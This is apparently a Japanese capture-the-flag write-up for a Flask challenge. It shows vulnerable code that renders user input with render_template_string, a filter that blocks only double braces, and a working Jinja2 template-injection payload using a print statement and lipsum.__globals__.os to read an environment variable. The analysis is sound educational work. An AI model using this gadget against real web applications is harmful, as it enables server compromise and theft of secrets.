# Team-Check — Writeup

## flag

```
gctf{8a61038adf31fe0f17aaae2d031fbab4406f5b9cee69583a34e481f8a4c05b9a}
```

## まずソースを読む

`/check_team?teamname=...` でチーム名を入れると「AI使ったことあるか」を返してくれるだけのアプリ。
怪しいのはここ。

```python
# Security-Checks
if "{{" in team_name or "}}" in team_name:
    return render_template('index.html')

team_msg = flask.render_template_string(
    f"We are unsure if {team_name} has used AI in the past."
)
```

ユーザー入力を f-string で埋め込んだ文字列を、そのまま `render_template_string` に渡している。
→ **Jinja2 の SSTI** だなとすぐ分かる。

## フィルタをどう抜けるか

弾かれているのは `{{` と `}}` だけ。

じゃあ `{{ }}` 以外でテンプレートとして評価させる方法はないか？と考えると、Jinja2 には式 `{{ ... }}` の他に **ステートメント `{% ... %}`** がある。
`{% print(...) %}` を使えば `{{ ... }}` と同じように値を出力できるので、これでフィルタは無意味になる。

## flag はどこにある？

`entrypoint.sh` を見ると

```sh
export FLAG=$(cat /flag.txt)
```

となっていて、`/flag.txt` と環境変数 `FLAG` の2か所にある。
環境変数なら `os.environ` を読むだけなので楽。

Jinja2 のグローバルにある `lipsum` は関数なので `__globals__` から `os` モジュールに辿り着ける（SSTI の定番ルート）。

## payload

```
{%print(lipsum.__globals__.os.environ.FLAG)%}
```

これを `teamname` に入れて送ると

```
We are unsure if gctf{8a61038adf31fe0f17aaae2d031fbab4406f5b9cee69583a34e481f8a4c05b9a} has used AI in the past.
```

## 振り返り

- `render_template_string` にユーザー入力を混ぜている時点で SSTI を疑う
- `{{ }}` だけ潰しても `{% %}` が残っていれば意味がない
- `lipsum.__globals__.os` は短くて使いやすい定番ガジェット
